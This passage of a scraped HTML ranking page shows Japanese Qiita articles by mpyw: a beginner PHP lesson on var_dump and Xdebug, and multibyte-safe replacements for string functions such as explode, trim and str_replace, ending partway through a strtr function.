          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">printf</span><span class="p">(</span><span class="s1">'%d件中%d件目～%d件目(%dページ中%dページ目)を表示中'</span><span class="p">,</span>
              <span class="nv">$whole_count</span><span class="p">,</span>
              <span class="p">(</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nx">DISP_MAX</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
              <span class="nv">$tmp</span> <span class="o">+</span> <span class="nv">$current_count</span><span class="p">,</span>
              <span class="nv">$page_count</span><span class="p">,</span>
              <span class="nv">$page</span>
            <span class="p">);</span>
          <span class="p">}</span>
        <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />32位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>38</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/96ed939a208e3cb95472">【PHP入門講座】 デバッグ用関数</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-28 19:32:31</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-9e4f14f7ba1108d051d0">目次に戻る</a>
</h3>

<h1>
<span id="デバッグ用関数の導入" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E7%94%A8%E9%96%A2%E6%95%B0%E3%81%AE%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>デバッグ用関数の導入</h1>

<p>今までは全て表示に <code>echo</code> を用いてきました。この方法ではあらゆるものが <strong>文字列</strong> に変換されて表示されていました。しかし、中には文字列に変換せずにもとの形のままの情報を得たいこともあるでしょう。そこでよく使われるデバッグ用の関数、 <strong><code>var_dump</code></strong> の登場です。この関数を知っているのと知らないので作業効率が大きく変わることもあります。</p>

<p><strong>var_dump</strong><br>
<a href="http://php.net/manual/ja/function.var-dump.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.var-dump.php</a></p>

<p>まずは最も基本的な例から。整数をダンプしてみましょう。この関数の名前にもなっていますが、「ダンプ」とは <strong>デバッグのために中身を確認する作業</strong> のことを指します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(1)
</pre></div>
</div>

<p>1の左側に <code>int</code> と表示されました。これは次回から学んでいく、 <strong>型</strong> を表しているものです。 <code>int</code> は <strong>整数型</strong> を表します。次は以下のコードを実行してみましょう。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(1)
int(2)
int(3)
</pre></div>
</div>

<p>ここで <code>var_dump</code> 関数の2つの特性が見えてくると思います。</p>

<ul>
<li>変数だけでなく、直接 <strong>値</strong> をダンプすることも出来る。</li>
<li>複数の変数や値を渡すことが出来る。</li>
</ul>

<p>このコードを実行して上記の結果にはならず、</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(1) int(2) int(3)
</pre></div>
</div>

<p>と表示されてしまった方、いますでしょうか？もしこう表示されてしまっても何か間違ったことをしてしまったわけではありません。あなたが恐らく<ins>ブラウザ上でそのまま見ている</ins>のが原因でしょう。そのままページの <strong>HTMLソース</strong> を表示してみてください。正しく表示されるはずです。HTMLを今まで学んできた方であれば、改行コードをソースに記載してもブラウザ上では反映されないのはもちろんご存知ですよね。</p>

<p>HTMLソース上ではなくブラウザ上でそのまま確認したい場合に、以下のように <code>&lt;pre&gt;</code> タグを利用することがあります。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="x">&lt;pre&gt;</span>
<span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;/pre&gt;</span>
</pre></div></div>

<p>また、いっそのこと <strong>「HTMLじゃなくてテキストとして扱ってしまえ！」</strong> という発想で <code>header</code> 関数を使ってMIMEタイプを <code>text/plain</code> に変えてしまうのもアリです。これだとソースを見ているのと全く同じことになります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=utf-8'</span><span class="p">);</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
</pre></div>
</div>

<p>さて、次に文字列をダンプしてみましょう。日本語をダンプする際にはブラウザ上での文字化けを防ぐために <code>header</code> 関数で文字コードを指定しましょう。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'bc'</span><span class="p">,</span> <span class="s1">'def'</span><span class="p">,</span> <span class="s1">'あ'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>string(1) "a"
string(2) "bc"
string(3) "def"
string(3) "あ"
</pre></div>
</div>

<p><code>string</code> の右の数字は勘のいい人なら <strong>「文字数かな・・・？」</strong> って予想されると思いますが、半分正解・半分誤りとでも言っておきましょうか。何故ならば最後の例の <code>あ</code> で文字数だとおかしな結果となるからです。厳密な正解は <ins>バイト数</ins>です。この概念に関しては次の項で詳しく解説していくので、お楽しみに。</p>

<p>最後にいろいろな例を掲載しておきます。これから先、最終的にはこの全てを説明します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="s1">'Test'</span><span class="p">)</span> <span class="c1">// 文字列</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// 整数値</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mf">1.0</span><span class="p">);</span> <span class="c1">// 浮動小数点数(一般値)</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mf">1.8e308</span><span class="p">);</span> <span class="c1">// 浮動小数点数(無限大値)</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mf">1.8e308</span> <span class="o">-</span> <span class="mf">1.8e308</span><span class="p">);</span> <span class="c1">// 浮動小数点数(NAN値)</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="k">true</span><span class="p">);</span> <span class="c1">// 論理値(真)</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="k">false</span><span class="p">);</span> <span class="c1">// 論理値(偽)</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="k">null</span><span class="p">);</span> <span class="c1">// NULL値</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="k">array</span><span class="p">());</span> <span class="c1">// 配列</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="k">new</span> <span class="k">stdClass</span><span class="p">);</span> <span class="c1">// オブジェクト</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nb">tmpfile</span><span class="p">());</span> <span class="c1">// リソース</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>string(4) "Test"
int(1)
float(1)
float(INF)
float(NAN)
bool(true)
bool(false)
NULL
array(0) {
}
object(stdClass)#1 (0) {
}
resource(1) of type (stream)
</pre></div>
</div>

<h1>
<span id="xdebugによる拡張" class="fragment"></span><a href="#xdebug%E3%81%AB%E3%82%88%E3%82%8B%E6%8B%A1%E5%BC%B5"><i class="fa fa-link"></i></a>Xdebugによる拡張</h1>

<p>Xdebugは、<code>var_dump</code> による表示を見やすくするための機能などを備えた拡張ライブラリ（エクステンション）です。本来は <strong>PECL (PHP Extension Community Library)</strong> から自分でダウンロードしてきてインストールする必要があるのですが、何とXAMPPには既にインストール済みで、php.iniの設定で有効化するだけで使えるようになります。</p>

<p><strong>Xdebugによるデバッグ環境の構築</strong><br>
<a href="http://keicode.com/cgi/introducing-xdebug.php" class="autolink" rel="nofollow noopener" target="_blank">http://keicode.com/cgi/introducing-xdebug.php</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />33位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>37</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/ceae0ed5285093c76087">マルチバイト未対応の関数をいろいろ対応させてみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-10 06:37:12</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[正規表現]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>出来るだけもとの関数の挙動に近づけています。</p>

<h2>
<span id="basename-について" class="fragment"></span><a href="#basename-%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a><code>basename()</code> について</h2>

<p>PHP4.4.9まではNULLバイトを正しく処理できませんでしたが、<br>
<ins>PHP5.0.0以降はバイナリセーフ</ins>になりました。<br>
(徳丸さんよりご指摘を頂きました)</p>

<p>但し、 <code>setlocale()</code> で<ins>ロケールを正しく設定</ins>していることが前提になります。</p>

<p>エンコーディングが壊れていてもそのまま処理します。</p>

<h2>
<span id="マルチバイト対応-explode" class="fragment"></span><a href="#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%90%E3%82%A4%E3%83%88%E5%AF%BE%E5%BF%9C-explode"><i class="fa fa-link"></i></a>マルチバイト対応 <code>explode()</code>
</h2>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">UTF-8限定版</span></div>
<div class="highlight"><pre><span></span>explode() を使えば問題ない。
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">全エンコーディング対応版</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">mb_explode</span><span class="p">(</span><span class="nv">$delimiter</span><span class="p">,</span> <span class="nv">$string</span><span class="p">,</span> <span class="nv">$limit</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$encoding</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">mb_regex_encoding</span><span class="p">();</span>
    <span class="nb">mb_regex_encoding</span><span class="p">(</span><span class="nb">func_num_args</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="o">?</span> <span class="nv">$encoding</span> <span class="o">:</span> <span class="nb">mb_internal_encoding</span><span class="p">());</span>
    <span class="nv">$delimiter</span> <span class="o">=</span> <span class="nb">mb_ereg_replace</span><span class="p">(</span><span class="s1">'[.\\\\+*?\\[^$(){}|]'</span><span class="p">,</span> <span class="s1">'\\\\0'</span><span class="p">,</span> <span class="nv">$delimiter</span><span class="p">);</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mb_split</span><span class="p">(</span><span class="nv">$delimiter</span><span class="p">,</span> <span class="nv">$string</span><span class="p">,</span> <span class="nv">$limit</span><span class="p">);</span>
    <span class="nb">mb_regex_encoding</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>エンコーディングが壊れていてもそのまま処理します。</p>

<h2>
<span id="マルチバイト対応-str_split" class="fragment"></span><a href="#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%90%E3%82%A4%E3%83%88%E5%AF%BE%E5%BF%9C-str_split"><i class="fa fa-link"></i></a>マルチバイト対応 <code>str_split()</code>
</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">UTF-8限定版</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">str_split_utf8</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$split_length</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="p">(</span><span class="nv">$split_length</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$split_length</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">:</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">case</span> <span class="o">!</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">"/.{</span><span class="si">{</span><span class="nv">$split_length</span><span class="si">}</span><span class="s2">}|.++|</span><span class="se">\\</span><span class="s2">A</span><span class="se">\\</span><span class="s2">z/us"</span><span class="p">,</span> <span class="nv">$string</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">)</span><span class="o">:</span>
            <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
        <span class="k">default</span><span class="o">:</span>
            <span class="k">return</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>長さ指定が間違っているときは <strong>FALSE</strong> を返します。<br>
エンコーディングが壊れているときは <strong>NULL</strong> を返します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">全エンコーディング対応版</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">mb_str_split</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$split_length</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$encoding</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$split_length</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">func_num_args</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$encoding</span> <span class="o">=</span> <span class="nb">mb_internal_encoding</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="nv">$split_length</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ret</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">mb_substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="nv">$split_length</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ret</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>長さ指定が間違っているときは <strong>FALSE</strong> を返します。<br>
エンコーディングが壊れていてもそのまま処理します。</p>

<h2>
<span id="マルチバイト対応-trim" class="fragment"></span><a href="#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%90%E3%82%A4%E3%83%88%E5%AF%BE%E5%BF%9C-trim"><i class="fa fa-link"></i></a>マルチバイト対応 <code>trim()</code>
</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">UTF-8限定版</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">trim_utf8</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$charlist</span> <span class="o">=</span> <span class="s2">" </span><span class="se">\t\n\r\0\x0B</span><span class="s2">　"</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$charlist</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'..'</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="nv">$charlist</span><span class="p">,</span> <span class="s2">"^-:]</span><span class="se">\0\\</span><span class="s2">/"</span><span class="p">));</span>
    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">"/</span><span class="se">\\</span><span class="s2">A[</span><span class="si">{</span><span class="nv">$charlist</span><span class="si">}</span><span class="s2">]++|[</span><span class="si">{</span><span class="nv">$charlist</span><span class="si">}</span><span class="s2">]++</span><span class="se">\\</span><span class="s2">z/u"</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<p>エンコーディングが壊れているときには <strong>NULL</strong> を返します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">全エンコーディング対応版</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">mb_trim</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$charlist</span> <span class="o">=</span> <span class="s2">" </span><span class="se">\t\n\r\0\x0B</span><span class="s2">　"</span><span class="p">,</span> <span class="nv">$encoding</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">mb_regex_encoding</span><span class="p">();</span>
    <span class="nb">mb_regex_encoding</span><span class="p">(</span><span class="nb">func_num_args</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$encoding</span> <span class="o">:</span> <span class="nb">mb_internal_encoding</span><span class="p">());</span>
    <span class="nv">$charlist</span> <span class="o">=</span> <span class="nb">mb_ereg_replace</span><span class="p">(</span><span class="s1">'[\\[\\]^-]'</span><span class="p">,</span> <span class="s1">'\\\\0'</span><span class="p">,</span> <span class="nv">$charlist</span><span class="p">);</span>
    <span class="nv">$charlist</span> <span class="o">=</span> <span class="nb">mb_ereg_replace</span><span class="p">(</span><span class="s1">'\\.{2}'</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="nv">$charlist</span><span class="p">);</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mb_ereg_replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">A[</span><span class="si">{</span><span class="nv">$charlist</span><span class="si">}</span><span class="s2">]++|[</span><span class="si">{</span><span class="nv">$charlist</span><span class="si">}</span><span class="s2">]++</span><span class="se">\\</span><span class="s2">z"</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
    <span class="nb">mb_regex_encoding</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>エンコーディングが壊れていてもそのまま処理します。</p>

<p><code>ltrim()</code>, <code>rtrim()</code> もこんな感じでどうぞ。</p>

<h2>
<span id="マルチバイト対応-wordwrap" class="fragment"></span><a href="#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%90%E3%82%A4%E3%83%88%E5%AF%BE%E5%BF%9C-wordwrap"><i class="fa fa-link"></i></a>マルチバイト対応 <code>wordwrap()</code>
</h2>

<p>想像以上に処理が大変だったので今回はギブアップ（汗）<br>
マニュアルのコメント欄に投稿されているものもどれも再現性が微妙なものばかりで、みなさん苦戦されている様子。<br>
いろいろ試してみた結果、 <strong>Smarty</strong> の <code>mb_wordwrap()</code> が一番良さげだったので紹介しておきます。<br>
<a href="https://github.com/Jamesking56/Smarty-PHP/blob/master/plugins/shared.mb_wordwrap.php" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/Jamesking56/Smarty-PHP/blob/master/plugins/shared.mb_wordwrap.php</a></p>

<p>もっと簡単に書けたらいいのになぁ・・・</p>

<h2>
<span id="マルチバイト対応-str_replace" class="fragment"></span><a href="#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%90%E3%82%A4%E3%83%88%E5%AF%BE%E5%BF%9C-str_replace"><i class="fa fa-link"></i></a>マルチバイト対応 <code>str_replace()</code>
</h2>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">UTF-8限定版</span></div>
<div class="highlight"><pre><span></span>str_replace() を使えば問題ない。
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">全エンコーディング対応版</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">mb_str_replace</span><span class="p">(</span><span class="nv">$search</span><span class="p">,</span> <span class="nv">$replace</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">,</span> <span class="nv">$encoding</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">mb_regex_encoding</span><span class="p">();</span>
    <span class="nb">mb_regex_encoding</span><span class="p">(</span><span class="nb">func_num_args</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="o">?</span> <span class="nv">$encoding</span> <span class="o">:</span> <span class="nb">mb_internal_encoding</span><span class="p">());</span>
    <span class="k">foreach</span> <span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="nv">$search</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$replace</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$replace</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$replace</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$replace</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$r</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$s</span> <span class="o">=</span> <span class="nb">mb_ereg_replace</span><span class="p">(</span><span class="s1">'[.\\\\+*?\\[^$(){}|]'</span><span class="p">,</span> <span class="s1">'\\\\0'</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>
        <span class="nv">$subject</span> <span class="o">=</span> <span class="nb">mb_ereg_replace</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nb">mb_regex_encoding</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$subject</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>エンコーディングが壊れていてもそのまま処理します。</p>

<h2>
<span id="マルチバイト対応-strtr" class="fragment"></span><a href="#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%90%E3%82%A4%E3%83%88%E5%AF%BE%E5%BF%9C-strtr"><i class="fa fa-link"></i></a>マルチバイト対応 <code>strtr()</code>
</h2>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">UTF-8限定版シグネチャ</span></div>
<div class="highlight"><pre><span></span>string strtr_utf8 ( string $str , string $from , string $to )
string strtr_utf8 ( string $str , array $replace_pairs )
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">UTF-8限定版コード</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">strtr_utf8</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">func_num_args</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$replace_pairs</span><span class="p">)</span> <span class="o">=</span> <span class="nb">func_get_args</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$from</span><span class="p">,</span> <span class="nv">$to</span><span class="p">)</span> <span class="o">=</span> <span class="nb">func_get_args</span><span class="p">();</span>
        <span class="nv">$from</span> <span class="o">=</span> <span class="nb">preg_split</span><span class="p">(</span><span class="s1">'//u'</span><span class="p">,</span> <span class="nv">$from</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">PREG_SPLIT_NO_EMPTY</span><span class="p">);</span>
        <span class="nv">$to</span> <span class="o">=</span> <span class="nb">preg_split</span><span class="p">(</span><span class="s1">'//u'</span><span class="p">,</span> <span class="nv">$to</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">PREG_SPLIT_NO_EMPTY</span><span class="p">);</span>
        <span class="nv">$replace_pairs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$from</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$to</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$replace_pairs</span><span class="p">[</span><span class="nv">$f</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$to</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">}</span>
